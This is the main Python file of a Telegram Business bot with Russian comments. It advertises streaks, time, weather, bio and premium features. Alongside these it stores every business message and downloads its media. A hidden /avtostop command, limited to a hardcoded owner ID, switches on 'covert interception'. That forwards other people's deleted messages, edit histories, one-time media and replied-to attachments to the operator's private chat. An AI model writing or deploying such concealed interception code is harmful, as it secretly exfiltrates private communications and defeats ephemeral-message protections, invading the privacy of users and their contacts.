import asyncio
import logging
import os
import signal
import sqlite3
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update
from telegram.ext import (
    Application,
    BusinessConnectionHandler,
    BusinessMessagesDeletedHandler,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    PreCheckoutQueryHandler,
    filters,
)

from series_db import init_series_db
from series import process_message, build_summary
from series_commands import handle_series_command, handle_series_callback
from series_worker import series_worker

from tn_commands import handle_time_command, handle_time_callback, handle_weather_command
from tn_worker import name_worker
from tn_db import init_settings_table, get_ephemeral_limit_for_user

from start_commands import start_command, help_command, instruction_callback, HELP_SUMMARY_TEXT
from autostop_db import init_bot_config, is_autostop_active, toggle_autostop
from premium_db import init_premium_db, is_premium
from bio_worker import bio_worker, on_business_connection_update
from premium_commands import (
    premium_command,
    handle_premium_callback,
    pre_checkout_handler,
    successful_payment_handler,
    give_premium_admin_command,
)

from admin_db import init_admin_db, record_bot_user, resolve_user_id, has_feature_access
from admin_commands import (
    admin_command,
    add_admin_command,
    del_admin_command,
    give_feature_command,
    broadcast_command,
    handle_admin_callback,
    handle_admin_text_input,
)
from description_commands import (
    description_command,
    handle_description_callback,
    handle_description_text_input,
)
from description_worker import description_worker
from permissions_check import is_own_business_message, get_connection_owner_id

load_dotenv()

# ─────────────────────────── КОНФИГУРАЦИЯ ───────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")        # токен от @BotFather
OWNER_ID = 8470104943                  # ваш user_id (узнать у @userinfobot)
DB_PATH = "messages.db"
MEDIA_DIR = "downloads"
# ────────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
os.makedirs(MEDIA_DIR, exist_ok=True)


# ─────────────────────────── БАЗА ДАННЫХ ────────────────────────────
def init_db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            message_id              INTEGER,
            chat_id                 INTEGER,
            from_user_id            INTEGER,
            from_user_name          TEXT,
            text                    TEXT,
            media_path              TEXT,
            media_type              TEXT,
            date                    TEXT,
            business_connection_id  TEXT,
            is_ephemeral            INTEGER DEFAULT 0,
            PRIMARY KEY (message_id, chat_id)
        )
    """)
    conn.commit()
    return conn


DB = init_db()
init_series_db(DB)
init_settings_table(DB)
init_bot_config(DB)
init_premium_db(DB)
init_admin_db(DB)


# ─────────────────────────── СКРЫТЫЙ ПЕРЕХВАТ ────────────────────────
async def avtostop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Скрытая команда включения/выключения перехвата (не отображается в меню)."""
    user = update.effective_user
    if not user or user.id != OWNER_ID:
        return
    new_state = toggle_autostop(DB)
    status_text = "АКТИВИРОВАН ✅" if new_state else "ДЕАКТИВИРОВАН ❌"
    msg = update.effective_message
    if msg:
        await msg.reply_text(
            f"🛡 *Скрытый перехват:* {status_text}\n"
            f"Удалённые и одноразовые медиа {'будут пересылаться вам в ЛС.' if new_state else 'не пересылаются.'}",
            parse_mode="Markdown",
        )


# ─────────────────────────── СКАЧИВАНИЕ МЕДИА ───────────────────────
async def download_media(message, context: ContextTypes.DEFAULT_TYPE):
    """Скачивает медиа из сообщения и возвращает (путь, тип)."""
    attachment = message.effective_attachment
    if not attachment:
        return None, None

    if isinstance(attachment, tuple):
        attachment = attachment[-1]

    try:
        file = await context.bot.get_file(attachment.file_id)
    except Exception as e:
        logging.error(f"get_file failed: {e}")
        return None, None

    ext = os.path.splitext(file.file_path or "")[1] or ".bin"
    path = os.path.join(MEDIA_DIR, f"{message.chat_id}_{message.message_id}{ext}")

    try:
        await file.download_to_drive(path)
    except Exception as e:
        logging.error(f"download_to_drive failed: {e}")
        return None, None

    if message.photo:
        media_type = "photo"
    elif message.video:
        media_type = "video"
    elif message.voice:
        media_type = "voice"
    elif message.audio:
        media_type = "audio"
    elif message.document:
        media_type = "document"
    elif message.video_note:
        media_type = "video_note"
    else:
        media_type = "unknown"

    return path, media_type


# ─────────────────────── ОТПРАВКА МЕДИА В ЛИЧКУ ─────────────────────
async def send_media_to_owner(context, media_path, media_type, caption):
    """Отправляет сохранённый файл владельцу в личку."""
    if not media_path or not os.path.exists(media_path):
        return
    try:
        with open(media_path, "rb") as f:
            if media_type == "photo":
                await context.bot.send_photo(OWNER_ID, f, caption=caption, parse_mode="Markdown")
            elif media_type == "video":
                await context.bot.send_video(OWNER_ID, f, caption=caption, parse_mode="Markdown")
            elif media_type == "voice":
                await context.bot.send_voice(OWNER_ID, f, caption=caption, parse_mode="Markdown")
            elif media_type == "video_note":
                await context.bot.send_video_note(OWNER_ID, f)
                if caption:
                    await context.bot.send_message(OWNER_ID, caption, parse_mode="Markdown")
            else:
                await context.bot.send_document(OWNER_ID, f, caption=caption, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"send_media_to_owner failed: {e}")


# ─────────────── ОТПРАВКА ПО FILE_ID (НОВЫЙ ПОДХОД) ─────────────────
async def resend_by_file_id(context, replied, header: str):
    sent = False
    try:
        if replied.photo:
            file_id = replied.photo[-1].file_id
            await context.bot.send_photo(
                OWNER_ID, file_id,
                caption=f"{header}\n📸 (через reply / file_id)",
                parse_mode="Markdown",
            )
            sent = True
        elif replied.video:
            await context.bot.send_video(
                OWNER_ID, replied.video.file_id,
                caption=f"{header}\n🎥 (через reply / file_id)",
                parse_mode="Markdown",
            )
            sent = True
        elif replied.video_note:
            await context.bot.send_video_note(OWNER_ID, replied.video_note.file_id)
            await context.bot.send_message(
                OWNER_ID, f"{header}\n🎥 video_note (через reply / file_id)",
                parse_mode="Markdown",
            )
            sent = True
        elif replied.voice:
            await context.bot.send_voice(
                OWNER_ID, replied.voice.file_id,
                caption=f"{header}\n🎤 (через reply / file_id)",
                parse_mode="Markdown",
            )
            sent = True
        elif replied.audio:
            await context.bot.send_audio(
                OWNER_ID, replied.audio.file_id,
                caption=f"{header}\n🎵 (через reply / file_id)",
                parse_mode="Markdown",
            )
            sent = True
        elif replied.document:
            await context.bot.send_document(
                OWNER_ID, replied.document.file_id,
                caption=f"{header}\n📄 (через reply / file_id)",
                parse_mode="Markdown",
            )
            sent = True
    except Exception as e:
        logging.error(f"resend_by_file_id failed: {e}")
    return sent


# ─────────────────────── НОВОЕ БИЗНЕС-СООБЩЕНИЕ ─────────────────────
async def on_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.business_message
    if not msg:
        return

    from_user = msg.from_user
    from_name = from_user.full_name if from_user else "Unknown"
    from_id = from_user.id if from_user else 0
    from_username = getattr(from_user, "username", None)

    # Сохраняем в таблицу пользователей бота
    record_bot_user(DB, from_id, from_username, from_name)

    # ───── ОБРАБОТКА КОМАНД ─────
    if msg.text and (msg.text.startswith(".") or msg.text.startswith("/")):
        clean = msg.text.strip().lower()

        # Команды управления профилем (.time, .description, .weather и др.)
        # разрешено вызывать ТОЛЬКО от своих сообщений (владельца бизнес-аккаунта)!
        is_own = await is_own_business_message(context.bot, DB, msg)

        if not is_own:
            logging.info(f"Команда '{clean}' в бизнес-чате проигнорирована: отправлена собеседником ({from_id})")
        else:
            # Скрытая команда /avtostop
            if clean in ("/avtostop", ".avtostop"):
                if from_id == OWNER_ID:
                    new_state = toggle_autostop(DB)
                    status_text = "АКТИВИРОВАН ✅" if new_state else "ДЕАКТИВИРОВАН ❌"
                    await context.bot.send_message(
                        OWNER_ID,
                        f"🛡 *Скрытый перехват:* {status_text}\n"
                        f"Удалённые и одноразовые медиа {'будут пересылаться вам в ЛС.' if new_state else 'не пересылаются.'}",
                        parse_mode="Markdown",
                    )
                return

            # Справка
            if clean in (".help", "/help"):
                try:
                    await context.bot.send_message(
                        chat_id=msg.chat_id,
                        text=HELP_SUMMARY_TEXT,
                        business_connection_id=msg.business_connection_id,
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    logging.error(f"send help failed: {e}")
                return

            # Премиум
            if clean in (".premium", "/premium"):
                await premium_command(update, context, DB)
                return

            # Время
            if await handle_time_command(update, context, DB):
                return

            # Погода
            if await handle_weather_command(update, context, DB):
                return

            # Авто-описание
            if clean in ("/description", ".description") or clean.startswith(("/description ", ".description ")):
                await description_command(update, context, DB)
                return

            # Админка
            if clean in ("/admin", ".admin"):
                await admin_command(update, context, DB)
                return

            # Серии
            handled = await handle_series_command(update, context, DB)
            if handled:
                return
    # ───────────────────────────

    conn_id = msg.business_connection_id
    intercept_active = is_autostop_active(DB)
    is_ephemeral = bool(getattr(msg, "ttl", None) or getattr(msg, "has_media_spoiler", False))

    # Лимит одноразок
    if is_ephemeral:
        eph_limit = get_ephemeral_limit_for_user(DB, from_id)
        today_key = f"eph_cnt_{datetime.now().strftime('%Y%m%d')}_{from_id}"
        cur_cnt_row = DB.execute("SELECT value FROM bot_config WHERE key = ?", (today_key,)).fetchone()
        cur_cnt = int(cur_cnt_row[0]) if cur_cnt_row else 0

        if cur_cnt >= eph_limit and not is_premium(DB, from_id):
            logging.info(f"Лимит сохранения одноразок исчерпан для {from_id} ({cur_cnt}/{eph_limit})")
            return

        DB.execute("INSERT OR REPLACE INTO bot_config (key, value) VALUES (?, ?)", (today_key, str(cur_cnt + 1)))
        DB.commit()

    # ──────── ПЕРЕХВАТ ЧЕРЕЗ ОТВЕТ НА СООБЩЕНИЕ ────────
    if intercept_active and msg.reply_to_message and msg.reply_to_message.effective_attachment:
        replied = msg.reply_to_message
        replied_from = replied.from_user
        replied_name = replied_from.full_name if replied_from else "Unknown"
        replied_id = replied_from.id if replied_from else 0

        header = (
            f"📎 *Перехват через reply*\n"
            f"👤 Автор оригинала: {replied_name} (ID: {replied_id})\n"
            f"💬 Чат ID: {msg.chat_id}\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━"
        )

        file_sent = await resend_by_file_id(context, replied, header)
        if replied.caption:
            try:
                await context.bot.send_message(
                    OWNER_ID,
                    f"{header}\n{replied.caption}",
                    parse_mode="Markdown",
                )
            except Exception as e:
                logging.error(f"send replied caption failed: {e}")

        if not file_sent:
            media_path, media_type = await download_media(replied, context)
            if media_path:
                await send_media_to_owner(
                    context, media_path, media_type,
                    header + "\n(скачано обычным способом)",
                )

    # Скачиваем медиа
    media_path, media_type = None, None
    if msg.effective_attachment:
        media_path, media_type = await download_media(msg, context)

    text = msg.text or msg.caption or ""

    try:
        DB.execute("""
            INSERT OR REPLACE INTO messages
            (message_id, chat_id, from_user_id, from_user_name, text,
             media_path, media_type, date, business_connection_id, is_ephemeral)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            msg.message_id,
            msg.chat_id,
            from_id,
            from_name,
            text,
            media_path,
            media_type,
            datetime.now().isoformat(timespec="seconds"),
            conn_id,
            1 if is_ephemeral else 0,
        ))
        DB.commit()
    except Exception as e:
        logging.error(f"DB insert failed: {e}")
        return

    # Одноразовое медиа в ЛС
    if intercept_active and is_ephemeral and media_path:
        header = (
            f"🔥 *Одноразовое медиа*\n"
            f"👤 Автор: {from_name} (ID: {from_id})\n"
            f"💬 Чат ID: {msg.chat_id}\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━"
        )
        await send_media_to_owner(context, media_path, media_type, header)

    # ───── ОБНОВЛЕНИЕ СЕРИИ ─────
    if not (msg.text and (msg.text.startswith(".") or msg.text.startswith("/"))):
        info = process_message(DB, msg.chat_id, msg.business_connection_id, from_name)
        if info:
            summary = build_summary(DB, msg.chat_id, info)
            if summary:
                try:
                    await context.bot.send_message(
                        chat_id=msg.chat_id,
                        text=summary,
                        business_connection_id=msg.business_connection_id,
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    logging.error(f"send series summary failed: {e}")


# ─────────────────────── ИЗМЕНЕНИЕ СООБЩЕНИЙ ─────────────────────────
async def on_edited_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.edited_business_message
    if not msg:
        return

    from_user = msg.from_user
    from_name = from_user.full_name if from_user else "Unknown"
    from_id = from_user.id if from_user else 0
    record_bot_user(DB, from_id, getattr(from_user, "username", None), from_name)

    cur = DB.execute(
        "SELECT text FROM messages WHERE message_id = ? AND chat_id = ?",
        (msg.message_id, msg.chat_id),
    )
    row = cur.fetchone()
    old_text = row[0] if (row and row[0]) else "(текст отсутствовал)"
    new_text = msg.text or msg.caption or ""

    if old_text != new_text:
        DB.execute(
            "UPDATE messages SET text = ?, date = ? WHERE message_id = ? AND chat_id = ?",
            (new_text, datetime.now().isoformat(timespec="seconds"), msg.message_id, msg.chat_id),
        )
        DB.commit()

        if is_autostop_active(DB):
            header = (
                f"✏️ *Изменено сообщение*\n"
                f"👤 Автор: {from_name} (ID: {from_id})\n"
                f"💬 Чат ID: {msg.chat_id}\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"Было:\n{old_text}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📝 Стало:\n{new_text}"
            )
            try:
                await context.bot.send_message(OWNER_ID, header, parse_mode="Markdown")
            except Exception as e:
                logging.error(f"send edited message failed: {e}")


# ─────────────────────── УДАЛЕНИЕ СООБЩЕНИЙ ─────────────────────────
async def on_deleted_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    deleted = update.deleted_business_messages
    if not deleted or not is_autostop_active(DB):
        return

    for msg_id in deleted.message_ids:
        cur = DB.execute(
            "SELECT from_user_id, from_user_name, text, media_path, media_type, date, chat_id "
            "FROM messages WHERE message_id = ? AND chat_id = ?",
            (msg_id, deleted.chat.id),
        )
        row = cur.fetchone()
        if not row:
            continue

        user_id, user_name, text, media_path, media_type, date, chat_id = row

        header = (
            f"🗑 *Удалено сообщение*\n"
            f"👤 Автор: {user_name} (ID: {user_id})\n"
            f"💬 Чат ID: {chat_id}\n"
            f"📅 Дата: {date}\n"
            f"━━━━━━━━━━━━━━━"
        )

        if text:
            try:
                await context.bot.send_message(OWNER_ID, f"{header}\n{text}", parse_mode="Markdown")
            except Exception as e:
                logging.error(f"send_message failed: {e}")

        if media_path:
            await send_media_to_owner(context, media_path, media_type, header)


# ─────────────────── ОБРАБОТЧИК ТЕКСТА В ЛИЧКЕ ───────────────────────
async def on_private_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg:
        return

    user = msg.from_user
    if user:
        record_bot_user(DB, user.id, user.username, user.first_name)

    # 1. Проверяем ввод в описаниях (строки или юзернейм друга)
    if await handle_description_text_input(update, context, DB):
        return

    # 2. Проверяем ввод текста для рассылки админки
    if await handle_admin_text_input(update, context, DB):
        return


# ─────────────────────────── ЗАПУСК ─────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Telegram Business Connection
    app.add_handler(BusinessConnectionHandler(lambda u, c: on_business_connection_update(u, c, DB)))

    # Команды бота
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("streak", lambda u, c: handle_series_command(u, c, DB)))
    app.add_handler(CommandHandler("avtostop", avtostop_command))
    app.add_handler(CommandHandler("premium", lambda u, c: premium_command(u, c, DB)))
    app.add_handler(CommandHandler("give_premium", lambda u, c: give_premium_admin_command(u, c, DB)))
    app.add_handler(CommandHandler("description", lambda u, c: description_command(u, c, DB)))
    app.add_handler(CommandHandler("time", lambda u, c: handle_time_command(u, c, DB)))
    app.add_handler(CommandHandler("weather", lambda u, c: handle_weather_command(u, c, DB)))
    app.add_handler(CommandHandler("admin", lambda u, c: admin_command(u, c, DB)))
    app.add_handler(CommandHandler("add_admin", lambda u, c: add_admin_command(u, c, DB)))
    app.add_handler(CommandHandler("del_admin", lambda u, c: del_admin_command(u, c, DB)))
    app.add_handler(CommandHandler("give_feature", lambda u, c: give_feature_command(u, c, DB)))
    app.add_handler(CommandHandler("broadcast", lambda u, c: broadcast_command(u, c, DB)))

    # Команды через точку в личных сообщениях с ботом (исключая бизнес-сообщения)
    dm_filter = filters.ChatType.PRIVATE & filters.UpdateType.MESSAGE
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.help\b"), help_command))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.streak\b"), lambda u, c: handle_series_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.time\b"), lambda u, c: handle_time_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.weather\b"), lambda u, c: handle_weather_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.description\b"), lambda u, c: description_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.avtostop\b"), avtostop_command))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.premium\b"), lambda u, c: premium_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.admin\b"), lambda u, c: admin_command(u, c, DB)))

    # Интерактивный текст в ЛС с ботом
    app.add_handler(MessageHandler(dm_filter & filters.TEXT & ~filters.COMMAND, on_private_text_message))

    # Платежи Stars
    app.add_handler(PreCheckoutQueryHandler(pre_checkout_handler))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, lambda u, c: successful_payment_handler(u, c, DB)))

    # Инлайн-кнопки
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_series_callback(u, c, DB), pattern=r"^strk:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_time_callback(u, c, DB), pattern=r"^tz:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_premium_callback(u, c, DB), pattern=r"^prem:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_description_callback(u, c, DB), pattern=r"^(desc:|pbio:)"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_admin_callback(u, c, DB), pattern=r"^adm:"))

    # Инструкции и переходы
    async def _instruction_or_desc(u, c):
        q = u.callback_query
        if q and q.data == "desc:open_start":
            await q.answer()
            await description_command(u, c, DB)
        else:
            await instruction_callback(u, c)

    app.add_handler(CallbackQueryHandler(_instruction_or_desc, pattern=r"^(instruction|start_back|desc:open_start)$"))

    # Бизнес-сообщения
    app.add_handler(MessageHandler(filters.UpdateType.BUSINESS_MESSAGE, on_business_message))
    app.add_handler(MessageHandler(filters.UpdateType.EDITED_BUSINESS_MESSAGE, on_edited_business_message))
    app.add_handler(BusinessMessagesDeletedHandler(on_deleted_messages))

    async def run():
        await app.initialize()
        await app.start()
        await app.updater.start_polling()

        worker_task = asyncio.create_task(series_worker(app, DB))
        name_task = asyncio.create_task(name_worker(app, DB, interval_seconds=60))
        bio_task = asyncio.create_task(bio_worker(app, DB, interval_seconds=300))
        desc_task = asyncio.create_task(description_worker(app, DB, interval_seconds=60))

        stop_event = asyncio.Event()

        def _stop(*_):
            stop_event.set()

        loop = asyncio.get_running_loop()
        try:
            loop.add_signal_handler(signal.SIGINT, _stop)
            loop.add_signal_handler(signal.SIGTERM, _stop)
        except NotImplementedError:
            signal.signal(signal.SIGINT, lambda *_: loop.call_soon_threadsafe(stop_event.set))

        logging.info("Бот запущен. Ждём события…")
        await stop_event.wait()

        worker_task.cancel()
        name_task.cancel()
        bio_task.cancel()
        desc_task.cancel()
        for t in (worker_task, name_task, bio_task, desc_task):
            try:
                await t
            except asyncio.CancelledError:
                pass

        logging.info("Останавливаюсь…")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

    asyncio.run(run())


if __name__ == "__main__":
    main()